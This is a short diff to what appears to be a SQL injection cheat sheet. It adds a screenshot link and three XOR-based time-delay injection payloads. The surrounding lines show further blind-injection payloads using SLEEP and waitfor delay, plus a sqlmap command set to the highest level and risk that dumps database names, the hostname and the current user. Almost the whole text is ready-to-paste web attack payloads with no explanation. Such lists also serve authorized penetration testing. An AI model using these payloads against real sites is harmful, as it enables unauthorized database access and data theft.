@@ -16,6 +16,12 @@ orwa' AND (SELECT 6377 FROM (SELECT(SLEEP(5)))hLTl)--
 ));waitfor delay '0:0:5'-- 
 ```
 
+![image](https://user-images.githubusercontent.com/63053441/155585150-722a2ec2-787d-42bd-85d7-30c6401f8031.png)
+```
+0"XOR(if(now()=sysdate(),sleep(12),0))XOR"Z
+0"XOR(if(now()=sysdate(),sleep(12),0))XOR"Z%20=%3E
+0'XOR(if(now()=sysdate(),sleep(3),0))XOR'Z
+```
 
 sqlmap -r request.txt -p parameter-name --force-ssl --level 5 --risk 3  --dbs --hostname --current-user
 
